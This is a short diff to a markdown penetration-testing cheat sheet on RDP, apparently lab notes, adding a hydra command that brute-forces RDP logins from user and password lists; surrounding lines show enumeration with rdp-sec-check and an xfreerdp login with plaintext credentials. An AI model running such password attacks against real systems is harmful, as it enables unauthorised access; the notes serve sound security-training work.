@@ -24,6 +24,12 @@ The Remote Desktop Protocol (RDP) is a protocol developed by Microsoft for remot
 - `git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check`
 - `./rdp-sec-check.pl 10.129.201.248`
 
+### Password Attack
+
+#### hydra
+
+- `hydra -L user.list -P password.list rdp://10.129.42.197`
+
 ### Connect to RDP
 
 - `xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248`
